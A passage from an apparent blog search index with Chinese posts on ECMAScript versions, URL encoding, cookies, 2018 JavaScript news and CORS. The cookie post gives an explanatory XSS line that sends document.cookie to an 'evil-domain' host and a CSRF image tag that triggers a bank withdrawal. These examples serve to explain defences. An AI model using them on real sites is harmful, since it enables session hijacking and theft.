，原因是由于这个过程比较晚，人们仍然把它习惯性的称为 ES6 ，社区并不是忘记了 ES2015 版本的命名 —— 只不过大家仍然在按照版本号来称呼 ES 的版本。 这个表应该清楚一点： Edition Official name Date pulished ES9 ES2018 June 2018 ES8 ES2017 June 2017 ES7 ES2016 June 2016 ES6 ES2015 June 2015 ES5.1 ES5.1 June 2011 ES5 ES5 December 2009 ES4 ES4 Abandoned ES3 ES3 December 1999 ES2 ES2 June 1998 ES1 ES1 June 1997 ES.Next 始终指示下一版本 JavaScript 的名称。 下一个版本何时推出？ 从历史上看，JavaScript 新版本（ES2018）在今年夏季已经标准化，因此我们可以预期为 ECMAScript 2019（ ES2019 或 ES10 ）将于2019年夏季发布。 关于 TC39 TC39 是 JavaScript 发展委员会。 TC39 的成员是涉及 JavaScript 和浏览器供应商的公司，包括 Mozilla，Google，Facebook，Apple，Microsoft，Intel，PayPal，SalesForce等。 每个标准版本提案都必须经过几个阶段，这里将对此进行解释。 参考 关于 ECMASCRIPT 发展史和现状 – JavaScript 完全手册（2018版）ECMA-262]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Ecma</tag>
        <tag>ECMAScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[区分escape、encodeURI和encodeURIComponent]]></title>
    <url>%2Fblob%2F2019-04-15-distinguish-escape%2C-encodeuri-and-encodeuricomponent%2F</url>
    <content type="text"><![CDATA[escape escape和它们不是同一类，简单来说，escape是对字符串(string)进行编码(而另外两种是对URL)，作用是让它们在所有电脑上可读。编码之后的效果是%XX或者%uXXXX这种形式。 其中 ASCII字母、数字、@*/+ ，这几个字符不会被编码，其余的都会。 最关键的是，当你需要对URL编码时，请忘记这个方法，这个方法是针对字符串使用的，不适用于URL。 unescape可以对其编码后的结果进行解码。 encodeURI 和 encodeURIComponent 对URL编码是常见的事，所以这两个方法应该是实际中要特别注意的，它们都是编码URL，唯一区别就是编码的字符范围。 encodeURI方法不会对下列字符编码 ASCII字母、数字、~!@#$&amp;*()=:/,;?+’ encodeURIComponent方法不会对下列字符编码 ASCII字母、数字、~!*()’ 所以encodeURIComponent比encodeURI编码的范围更大。 对应解码方式有decodeURI 和 decodeURIComponent 如何去使用 如果只是编码字符串，不和URL有半毛钱关系，那么用escape。 如果你需要编码整个URL，然后需要使用这个URL，那么用encodeURI。 比如 1 encodeURI("http://www.cnblogs.com/season-huang/some other thing"); //编码后会变为 1 &quot;http://www.cnblogs.com/season-huang/some%20other%20thing&quot;; 当你需要编码URL中的参数的时候，那么encodeURIComponent是最好方法。 1234 let param = "http://www.cnblogs.com/season-huang/"; //param为参数param = encodeURIComponent(param);let url = "http://www.cnblogs.com?next=" + param;console.log(url) //"http://www.cnblogs.com?next=http%3A%2F%2Fwww.cnblogs.com%2Fseason-huang%2F" 参考 简单明了区分escape、encodeURI和encodeURIComponent]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>escape</tag>
        <tag>unescape</tag>
        <tag>encodeURI</tag>
        <tag>encodeURIComponent</tag>
        <tag>decodeURI</tag>
        <tag>decodeURIComponent</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cookie 简介]]></title>
    <url>%2Fblob%2F2019-04-15-introduction-to-cookie%2F</url>
    <content type="text"><![CDATA[cookie 简介 Cookie是由网景公司的前雇员Lou Montulli在1993年发明的，现今Cookie已经广泛使用了。 HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。 Cookie主要用于以下三个方面： 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如跟踪分析用户行为等） Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie渐渐被淘汰。由于服务器指定Cookie后，浏览器的每次请求都会携带Cookie数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB 。 所以当下Cookie只有一个功能：回话状态管理而且仅仅是用户登录状态保持。 每个域名下的cookie 的大小最大为4KB，每个域名下的cookie数量最多为20个（但很多浏览器厂商在具体实现时支持大于20个）。 cookie 创建 当服务器收到HTTP请求时，服务器可以在响应头里面添加一个Set-Cookie选项。浏览器收到响应后通常会保存下Cookie，之后对该服务器每一次请求中都通过Cookie请求头部将Cookie信息发送给服务器。另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。 而且Cookie也可以由客户端设置。 服务器设置cookie 服务器使用Set-Cookie响应头部向用户代理（一般是浏览器）发送Cookie信息。 不管你是请求一个资源文件（如 html/js/css/图片），还是发送一个ajax请求，服务端都会返回response。而response header中有一项叫set-cookie，是服务端专门用来设置cookie的。如下图所示，服务端返回的response header中有5个set-cookie字段，每个字段对应一个cookie（注意不能将多个cookie放在一个set-cookie字段中），set-cookie字段的值就是普通的字符串，每个cookie还设置了相关属性选项。 Node.js 1 response.setHeader(&apos;Set-Cookie&apos;, [&apos;type=ninja&apos;, &apos;language=javascript&apos;]); 注意： 一个set-Cookie字段只能设置一个cookie，当你要想设置多个 cookie，需要添加同样多的set-Cookie字段。 服务端可以设置cookie 的所有选项：expires、domain、path、secure、HttpOnly 客户端设置cookie 通过js代码来设置cookie，在控制台中我们执行了下面代码 1 document.cookie = "name=Jonh; "; 查看浏览器 cookie 面板如下图所示，cookie确实设置成功了，而且属性选项 domain、path、expires都用了默认值。再执行下面代码： 1 document.cookie="age=12; expires=Thu, 26 Feb 2116 11:50:25 GMT; domain=sankuai.com; path=/"; 查看浏览器cookie 面板，如下图所示，新的cookie设置成功了，而且属性选项 domain、path、expires都变成了设定的值。 客户端可以设置cookie 的下列选项：expires、domain、path、secure（有条件：只有在https协议的网页中，客户端设置secure类型的 cookie 才能成功），但无法设置HttpOnly选项。 用js一次也是只能设置一个cookie。 cookie存储的是字符串，所以对象需要先toString，或者自定义toString，如果有特殊字符需要编码（编码参考这里） 一个简单cookie例子，里面包含增删改查cookie的例子： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273 /*\|*||*| :: cookies.js ::|*||*| A complete cookies reader/writer framework with full unicode support.|*||*| Revision #3 - July 13th, 2017|*||*| https://developer.mozilla.org/en-US/docs/Web/API/document.cookie|*| https://developer.mozilla.org/User:fusionchess|*| https://github.com/madmurphy/cookies.js|*||*| This framework is released under the GNU Public License, version 3 or later.|*| http://www.gnu.org/licenses/gpl-3.0-standalone.html|*||*| Syntaxes:|*||*| * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])|*| * docCookies.getItem(name)|*| * docCookies.removeItem(name[, path[, domain]])|*| * docCookies.hasItem(name)|*| * docCookies.keys()|*|\*/var docCookies = &#123; getItem: function (sKey) &#123; if (!sKey) &#123; return null; &#125; return decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, "\\$&amp;") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null; &#125;, setItem: function (sKey, sValue, vEnd, sPath, sDomain, bSecure) &#123; if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) &#123; return false; &#125; var sExpires = ""; if (vEnd) &#123; switch (vEnd.constructor) &#123; case Number: sExpires = vEnd === Infinity ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; max-age=" + vEnd; /* Note: Despite officially defined in RFC 6265, the use of `max-age` is not compatible with any version of Internet Explorer, Edge and some mobile browsers. Therefore passing a number to the end parameter might not work as expected. A possible solution might be to convert the the relative time to an absolute time. For instance, replacing the previous line with: */ /* sExpires = vEnd === Infinity ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; expires=" + (new Date(vEnd * 1e3 + Date.now())).toUTCString(); */ break; case String: sExpires = "; expires=" + vEnd; break; case Date: sExpires = "; expires=" + vEnd.toUTCString(); break; &#125; &#125; document.cookie = encodeURIComponent(sKey) + "=" + encodeURIComponent(sValue) + sExpires + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : "") + (bSecure ? "; secure" : ""); return true; &#125;, removeItem: function (sKey, sPath, sDomain) &#123; if (!this.hasItem(sKey)) &#123; return false; &#125; document.cookie = encodeURIComponent(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : ""); return true; &#125;, hasItem: function (sKey) &#123; if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) &#123; return false; &#125; return (new RegExp("(?:^|;\\s*)" + encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, "\\$&amp;") + "\\s*\\=")).test(document.cookie); &#125;, keys: function () &#123; var aKeys = document.cookie.replace(/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g, "").split(/\s*(?:\=[^;]*)?;\s*/); for (var nLen = aKeys.length, nIdx = 0; nIdx &lt; nLen; nIdx++) &#123; aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]); &#125; return aKeys; &#125;&#125;; 如果上面代码中设定过期时间使用的小时或者天，可以使用下面的方法： 123 var exdate = new Date()sExpires = exdate.setTime(exdate.getTime() + sExpires * 864e+5) // 时间类型是天sExpires = exdate.setTime(exdate.getTime() + sExpires * 36e+5) // 时间类型是小时 由于服务器和浏览器的时间不是同步的，有时会设置 Max-Age 属性，但是该属性是HTTP/1.1才有的，因此需要向下兼容使用 expires。 cookie 读取 普通读取使用document.cookie读取，如果需要读取单个cookie查看上面例子 有时读取cookie需要跨域，查看跨源数据存储访问 cookie 的属性 在chrome控制台中的Application选项卡中可以看到cookie的信息。 key为一个cookie的名称，对应控制台中的Name列。 value为一个cookie的值，对应控制台中的Value列。 Domain 和 Path分别对应控制台的 Domain 和 Path 列。 Domain 和 Path 标识定义了Cookie的作用域：即Cookie应该发送给哪些URL(URL 可以是js/html/img/css资源请求等XHR 请求)。但是跨域的请求默认是不会发送Cookie的，查看原因附带身份凭证的请求。 Domain 标识指定了哪些主机可以接受Cookie。如果不指定，默认为当前文档的主机。如果设置为一级域名，则子域名能识别到该Cookie。 Path 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中）。以字符 %x2F (“/“) 作为路径分隔符，子路径也会被匹配。 Expires 和 Max-Age分别对应控制台中的 Expires 和 Max-Age 列。 不指定这两个值则为会话期Cookie，浏览器关闭之后它会被自动删除；有些浏览器提供了会话恢复功能，即使关闭了浏览器，会话期Cookie也会被保留下来。 指定任意一个则为持久性Cookie；如果是服务器设置 cookie 则 Expires 时间是服务器时间，可能和浏览器时间不同的，导致细微的差距，指定过期可设置一个过去的时间；Max-Age 设置的是秒数，时间从浏览器接收到该参数的时刻开始计算一个具体的时间作为过期时间。指定过期可设置为0或者负数。 Secure对应控制台中的Name列。 标记为 Secure 的Cookie只应通过被HTTPS协议加密过的请求发送给服务端。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http:）无法使用Cookie的 Secure 标记。 而且该属性只能在https协议下进行设置。 HttpOnly对应控制台中的HTTP列。 为避免跨域脚本 (XSS) 攻击，通过JavaScript的 Document.cookie API无法访问带有 HttpOnly 标记的Cookie，它们只应该发送给服务端。 HttpOnly 只能通过服务端进行设置。 SameSite Cookies对应控制台中的SameSite列。 SameSite Cookie允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。但目前SameSite Cookie还处于实验阶段，并不是所有浏览器都支持。 cookie 安全 会话劫持和XSS 在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。 1 (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie; HttpOnly类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。 跨站请求伪造（CSRF） 比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求： 1 &lt;img src="http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory"&gt; 当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。 具体阻止的办法查看浅谈CSRF，还是那句话没有攻不破的防御，只是攻击成本的问题。 追踪和隐私 第三方Cookie 每个Cookie都会有与之关联的域（Domain），如果Cookie的域和页面的域相同，那么我们称这个Cookie为第一方Cookie（first-party cookie），如果Cookie的域和页面的域不同，则称之为第三方Cookie（third-party cookie.）。 大多数浏览器默认都允许第三方Cookie，但是可以通过附加组件来阻止第三方Cookie（如EFF 的Privacy Badger ）。 禁止追踪Do-Not-Track 虽然并没有法律或者技术手段强制要求使用 DNT ，但是通过DNT可以告诉Web程序不要对用户行为进行追踪或者跨站追踪。 欧盟Cookie指令 关于Cookie，欧盟已经在 2009/136/EC 指令中提了相关要求，在征得用户的同意之前，网站不允许通过计算机、手机或其他设备存储、检索任何信息。 僵尸Cookie和删不掉的Cookie这类Cookie较难以删除，甚至删除之后会自动重建。它们一般是使用Web storage API、Flash本地共享对象或者其他技术手段来达到的。相关内容可以看： Standard HTTP cookies Storing cookies in and reading out web history Storing cookies in HTTP ETags Internet Explorer userData storage (starting IE9, userData is no longer supported) HTML5 Session Storage HTML5 Local Storage HTML5 Global Storage HTML5 Database Storage via SQLite Storing cookies in RGB values of auto-generated, force-cached PNGs using HTML5 Canvas tag to read pixels (cookies) back out Local shared objects (Flash cookies) Silverlight Isolated Storage Cookie syncing scripts that function as a cache cookie and respawn the MUID cookie[5] TCP Fast Open TLS’s Session ID 参考 cookie属性详解：http://www.cnblogs.com/tzyy/p/4151291.html讲解：https://harttle.land/2015/08/10/cookie-session.html#header-2MDN HTTP Cookie：https://developer.mozilla.org/en-US/docs/Web/HTTP/CookiesMDN HTTP Cookie：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CookiesMDN HTTP Headers Cookie：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/CookieMDN Set-Cookie：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-CookieMDN Document Cookie：https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie聊一聊 cookie：https://segmentfault.com/a/1190000004556040#articleHeader6 深入了解浏览器存储–从cookie到WebStorage、IndexedDB：https://segmentfault.com/a/1190000018748168?utm_source=weekly&amp;utm_medium=email&amp;utm_campaign=email_weekly]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>cookie</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018年，JavaScript都经历了什么]]></title>
    <url>%2Fblob%2F2019-04-11-what-did-javascript-experience-in-2018%2F</url>
    <content type="text"><![CDATA[本文转载自：2018年，JavaScript都经历了什么？ 本文灵感来自JavaScript Weekly周报，欢迎大家订阅。 The State of JavaScript 2018 The State of JavaScript调研已经连续做了3年(2016, 2017, 2018)，2018一共调研了2万多个JS开发者。有这样一些有意思的发现： 绝大多数开发者都用过ES6，同时TypeScript也越来越流行了； React依然最流行的前端框架，同时Vue也越来越受欢迎了； Express依然是最流行的Node.js框架(Node 8已经支持async函数了，Koa的价值应该少了很多)； Visual Studio code远远超越Sublime，成为最流行的JS编辑器； 作为一个后端用Express框架，尽量使用最新的ECMAScript语法，而前端用着TypeScript，不过框架还是AngularJS 1(这事要怪版本帝Angular不向后兼容)，抛弃价值70刀的Sublime，今年加入VS code阵营的JSer，我也是算是够主流了吧！那你呢？ ECMAScript 2018 TC39(ECMAScript标准委员会)这些年越来越勤快了，从2015年(ES6)开始，每年发布一个新的ECMAScipt标准。今年大佬们继续忙于处理各种proposal。ECMAScript 2018，即ES9，则在6月如期发布了，其新增的特性并不多： 主要新特性: Asynchronous Iteration Rest/Spread Properties 新的正则表达式特性: RegExp named capture groups RegExp Unicode Property Escapes RegExp Lookbehind Assertions s (dotAll) flag for regular expressions 其他新特性: Promise.prototype.finally() Template Literal Revision如果想了解ES9的细节，阔以看看Axel Rauschmayer博士写的Exploring ES2018 and ES2019。 Node 10 Node 10在4月发布并且在10月成为LTS，即长期支持版本。 Node 10使用了新的V8引擎6.8，因此性能提升了很多，比如Promise与Async函数的性能提升就非常明显，因此建议大家升级。 Node新版本的发布日期一直非常稳定，做到这一点也是不容易啊！ Vue 3.0 在Vue.js Conference Toronto 2018上，尤雨溪发表了主题演讲Vue 3.0 Updates，新版本将会有这些变化： 更快 更小 更易于维护 更多的原生支持 放弃Flow，使用TypeScript Vue 3.0预计将在2019发布，大家期待吧！ Babel 7 2年多时间commit了4000多次，Babel 7终于发布了，新增了下面这些特性： babel-upgrade: 升级Babel的工具； babel.config.js：学习ESLint与Webpack，使用JS文件配置； overrides：允许同一个项目使用不同的Babel配置，例如前端代码的targets为Chrome 60，而后端代码的targets为Node 8； … 主流浏览器对新的ECMAScript特性已经支持得不错了，不过还是存在并且永远存在很多非主流浏览器，于是我们还是离不开神奇的Babel。 jQuery 3.3.0 曾经风靡一时的jQuery发布了3.3.0，这个版本放弃了(deprecated)一系列方法： jQuery.now jQuery.isWindow jQuery.camelCase jQuery.proxy jQuery.type jQuery.isNumeric jQuery.isFunction Event aliases这些方法大多会在jQuery 4.0中被删除，因此jQuery官方鼓励大家使用替代的方法。 从这个更新也能看出端倪，jQuery时代已经逐渐过去了，GitHub的极客们干脆完全抛弃了jQuery。 V8引擎10周年 强大的V8引擎已经发布10周年了，它的命名灵感来自超级性能车的V8引擎，果然名副其实！其性能一直稳步提高： V8引擎当初是为Chrome浏览器开发的，但是早已成为一个独立的项目。国内的众多浏览器，包括搜狗、360、猎豹、QQ、百度、UC都是基于Chromium浏览器开发，而Chromium相当于开源版本的Chrome，自然也是基于V8引擎的。因此，众多”国产”浏览器实际上都是基于V8的。融资了2.5亿元红芯浏览器也不例外，他们干脆打包了Chrome浏览器的安装包，果然有钱任性！还有，就连浏览器界的一朵奇葩 Microsoft也投靠了Chromium阵营。 另外，Node.js也是基于V8引擎的。 NPM模块event-stream被黑客攻击 这件事闹得沸沸扬扬，不过只是有很多噱头，如果认真分析黑客干了什么，其真实影响没那么大，至少Vue开发者没啥好担心的： 比特币钱包copay依赖event-stream模块； 黑客从骗取了event-stream模块的npm发布权限； 黑客为event-stream模块添加了依赖flatmap-stream； flatmap-stream含有黑客代码，仅会在copay项目中正确执行，窃取用户的密码、私钥等信息，从而盗取比特币； 有人说什么Vue可能遭受攻击，其实没有这回事，因为黑客代码只会在copay项目中正确执行。只有copay项目的package.json中的 description字符串”A Secure Bitcoin Wallet”能够解密黑客代码；而且，黑客的代码是为copay量身定做的，对其他项目没有作用；再说，黑客是来窃取的比特币的，又不是挖矿，你的项目有比特币给人家偷吗?同学们，不要被标题党给骗了啊！ 《Refactoring》第2版改用JavaScript 《重构：改善既有代码的设计》大多数人都没看过，但是至少应该都听过。这本书刚出了第二版，所有示例代码由Java改成了JavaScript。 根据作者Martin Fowler的解释，《重构》这本书重点在于思想，适用于各种编程语言，所以选择什么语言并不重要。而他选择JavaScript的原因很简单，因为JS既支持面向过程编程，又支持面向对象编程，这样方便写非OOP代码重构的示例。 这里不妨引用尤雨溪的一句话： 至于重构、设计什么的，我只想说，看的是使用的人的水平，跟用什么语言没那么大关系。水平烂的人用 TS 一样写的是翔一样的代码，看看 java 就知道了。 《Refactoring》的示例代码用什么语言写根本不重要，重要的是背后的编程思想。顺便推荐一下《Clean Code》。 这本书原价54.66刀，的确有点贵，不过算是必读书，大家看着办… GitHub抛弃jQuery 一直以来，GitHub最流行的编程语言都是JavaScript，可以说GitHub是全球最大的JS开发者社交平台了；同时，因为被IE的兼容问题折磨了多年，前端痛恨Microsoft！但是，有钱任性的Microsoft以75亿美元收购了GitHub！ 另外，GitHub的技术极客们花了数年时间，以非常规范的流程完全移除GitHub网站了jQuery： 实现了一个ESlint插件eslint-plugin-jquery，禁止在代码中使用已经弃用的jQuery方法。这样可以防止同事使用jQuery方法。 使用原生代码重写了2个依赖于jQuery的模块jquery-pjax和facebox。 开发一个定制的jQuery版本，一旦完全移除某个jQuery方法，就删除jQuery中的对应代码。这样既可以减少jQuery大小，也可以防止同事使用已经移除的jQuery方法。 根据用户统计数据，来逐步放弃支持低版本的IE浏览器，这样的话可以无需依赖jQuery来保证兼容性。 …是否使用jQuery各有各的想法和需求，但是GitHub弃用jQuery的流程非常专业，可以作为处理技术债的标准规范。 Microsoft爱上JavaScript 土豪Microsoft似乎爱上了JavaScript，它家的Office 365, MicroSoft Teams以及Skype都开始使用JavaScript重写了。原因无疑是JS的跨平台特性。同一套代码多处运行，虽然现在还有很多问题，但是这样的未来不是挺好么？ 此处应该再来感受一下大名鼎鼎的Atwood’s Law： Any application that can be written in JavaScript, will eventually be written in JavaScript 在浏览器市场上，Microsoft曾经通过捆绑Windows打败了网景，不过这些年在Chrome面前一败涂地，现在终于”认输”，选择基于Chromium重写浏览器。对于JSer来说，至少意味着浏览器兼容问题可以缓解很多。 根据The State of JavaScript 2018，Microsoft开发的Visual Studio code俨然已经成为最受JSer欢迎的代码编辑器，一些流行插件下载量高达上千万： 市值超过Apple，重回全球市值最高公司的Microsoft有钱任性，买下了JS开发者最多的GitHub。 IT界的罗马帝国(出处：吴军《浪潮之巅》)Microsoft又重新崛起了，这是一件很了不起的事情。 Oracle宣示JavaScript主权 Oracle明年就要开始给Java收费，虽然只是JDK 8的u192之后的更新要收费，这个行为大概会让很多Java开发者不爽… 另外，Oracle还要求一个iOS开发者将一款叫做”HTML5, CSS, JavaScript, HTML, Snippet Editor“的App从App Store下架，因为App名字中包含“JavaScript”字眼，而Oracle拥有JavaScript在美国的商标权。 Oracle这位大爷惹不起，因此大家正在一本正经地建议给JavaScript改名。当然这基本上是不可能的，这辈子都不可能。。。 参考 2018年，JavaScript都经历了什么？ JavaScript黑客是这样窃取比特币的，Vue开发者不用担心！ 强烈推荐10个值得订阅的国外技术周报 ECMAScript 2018特性确定了]]></content>
      <categories>
        <category>FrontEnd</category>
      </categories>
      <tags>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跨域资源共享 CORS]]></title>
    <url>%2Fblob%2F2019-04-09-cross-domain-resource-sharing-cors%2F</url>
    <content type="text"><![CDATA[CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。 它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。 跨域资源共享（CORS）是一种机制，它使用额外的HTTP头告诉浏览器让在一个源（域）上运行的Web应用程序有权从不同源服务器访问指定的资源。Web应用程序在请求具有与其自己的源不同的源（域，协议和端口）的资源时执行跨源HTTP请求。 什么情况下需要 CORS ？ 跨域资源共享标准（ cross-origin sharing standard ）允许在下列场景中使用跨域 HTTP 请求： 前文提到的由 XMLHttpRequest 或 Fetch 发起的跨域 HTTP 请求。 Web 字体 (CSS 中通过 @font-face 使用跨域字体资源), 因此，网站就可以发布 TrueType 字体资源，并只允许已授权网站进行跨站调用。 WebGL 贴图 使用 drawImage 将 Images/video 画面绘制到 canvas 样式表（使用 CSSOM） 功能概述 跨域资源共享标准新增了一组 HTTP 首部字段，允许服务器声明哪些源站通过浏览器有权限访问哪些资源。另外，规范要求，对那些可能对服务器数据产生副作用的 HTTP 请求方法（特别是 GET 以外的 HTTP 请求，或者搭配某些 MIME 类型的 POST 请求），浏览器必须首先使用 OPTIONS 方法发起一个预检请求（preflight request），从而获知服务端是否允许该跨域请求。服务器确认允许之后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（包括 Cookies 和 HTTP 认证相关数据）。 CORS请求失败会产生错误，但是为了安全，在JavaScript代码层面是无法获知到底具体是哪里出了问题。你只能查看浏览器的控制台以得知具体是哪里出现了错误。 浏览器将CORS请求分成两类：简单请求（simple requests）和预检请求（Preflighted requests）。 简单请求 简单请求条件 只要同时满足以下条件，就属于简单请求。 请求方法使用下列方法之一： GET HEAD POST Fetch 规范定义了对 CORS 安全的首部字段集合，不得人为设置该集合之外的其他首部字段。该集合为： Accept Accept-Language Content-Language Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain DPR Downlink Save-Data Viewport-Width Width 请求中的任意XMLHttpRequestUpload 对象均没有注册任何事件监听器；XMLHttpRequestUpload 对象可以使用 XMLHttpRequest.upload 属性访问。 请求中没有使用 ReadableStream 对象。 注意Accept, Accept-Language, 和 Content-Language 首部字段在 WebKit/Safari 中可能不会将这些请求视为“简单请求”。 相关讨论：Require preflight for non-standard CORS-safelisted request headers Accept, Accept-Language, and Content-LanguageAllow commas in Accept, Accept-Language, and Content-Language request headers for simple CORS Switch to a blacklist model for restricted Accept headers in simple CORS requests 举例说明 下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段。 123456 GET /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... 上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。 如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。 如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。 1234 Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBarContent-Type: text/html; charset=utf-8 上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。 （1）Access-Control-Allow-Origin 该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。 （2）Access-Control-Allow-Credentials 该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。 （3）Access-Control-Expose-Headers 该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader(&#39;FooBar&#39;)可以返回FooBar字段的值 完整实例 一个简单请求的实例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354 &lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"&gt;&lt;head&gt; &lt;title&gt;Simple use of Cross-Site XMLHttpRequest (Using Access Control)&lt;/title&gt; &lt;script type="text/javascript"&gt; var invocation = new XMLHttpRequest(); var url = 'http://aruner.net/resources/access-control-with-get/'; var invocationHistoryText; function callOtherDomain() &#123; if(invocation)&#123; invocation.open('GET', url, true); invocation.onreadystatechange = handler; invocation.send(); &#125; else &#123; invocationHistoryText = "No Invocation TookPlace At All"; var textNode = document.createTextNode(invocationHistoryText); var textDiv = document.getElementById("textDiv"); textDiv.appendChild(textNode); &#125; &#125; function handler(evtXHR) &#123; if (invocation.readyState == 4) &#123; if (invocation.status == 200) &#123; var response = invocation.responseXML; var invocationHistory = response.getElementsByTagName('invocationHistory').item(0).firstChild.data; invocationHistoryText = document.createTextNode(invocationHistory); var textDiv = document.getElementById("textDiv"); textDiv.appendChild(invocationHistoryText); &#125; else alert("Invocation Errors Occured"); &#125; else dump("currently the application is at" + invocation.readyState); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;form id="controlsToInvoke" action=""&gt; &lt;p&gt; &lt;input type="button" value="Click to Invoke Another Site" onclick="callOtherDomain()" /&gt; &lt;/p&gt; &lt;/form&gt; &lt;p id="intro"&gt; This page basically makes invocations to another domain using cross-site XMLHttpRequest mitigated by Access Control. This is the simple scenario that is &lt;em&gt;NOT&lt;/em&gt; preflighted, and the invocation to a resource on another domain takes place using a simple HTTP GET. &lt;/p&gt; &lt;div id="textDiv"&gt; This XHTML document invokes another resource using cross-site XHR. &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 预检请求 与前述简单请求不同，“需预检的请求”要求必须首先使用 OPTIONS 方法发起一个预检请求到服务器，以获知服务器是否允许该实际请求。”预检请求“的使用，可以避免跨域请求对服务器的用户数据产生未预期的影响。 预检请求条件 当请求满足下述任一条件时，即应首先发送预检请求： 使用了下面任一 HTTP 方法： PUT DELETE CONNECT OPTIONS TRACE PATCH 人为设置了对 CORS 安全的首部字段集合之外的其他首部字段。该集合为： Accept Accept-Language Content-Language Content-Type：不属于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain DPR Downlink Save-Data Viewport-Width Width 请求中的XMLHttpRequestUpload 对象注册了任意多个事件监听器。请求中使用了ReadableStream对象。 注意Accept, Accept-Language, 和 Content-Language 首部字段在 WebKit/Safari 